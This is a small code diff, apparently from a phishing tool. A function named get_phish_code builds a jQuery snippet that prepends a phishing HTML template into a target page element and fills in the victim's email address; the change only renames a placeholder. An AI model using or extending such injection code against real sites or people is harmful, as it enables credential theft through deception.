@@ -14,7 +14,7 @@ def get_phish_code(email, url):
     injectClass = str(data[0][3])
     fil = open("./static/phish.html")
     content = "$('" + injectLoc + "').first().prepend(`"+ fil.read() + "`);"
-    content = content.replace("user-email-value", "'" + email.replace("\"", "") + "'" )
+    content = content.replace("userEmailValue", "'" + email.replace("\"", "") + "'" )
 
     return content.replace("some-container-class", injectClass)
 
